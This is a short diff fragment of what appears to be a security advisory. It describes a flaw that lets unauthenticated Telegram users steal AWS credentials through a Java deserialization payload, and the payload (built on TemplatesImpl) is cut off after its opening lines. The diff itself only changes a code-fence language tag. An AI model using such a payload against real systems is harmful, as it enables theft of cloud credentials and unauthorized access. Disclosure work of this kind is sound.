@@ -30,7 +30,7 @@ This allows any unauthenticated telegram user to send malicious content via text
 
 By using the following payload, attackers can steal AWS environment data such as `AWS_SESSION_TOKEN`, `AWS_SECRET_ACCESS_KEY`, `AWS_SECURITY_TOKEN`, which could be used to create an AWS [AssumeRole](https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role.html) and access AWS resources.
 
-```json
+```
 { 'id': 124,
   'obj':[ 'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',
     {
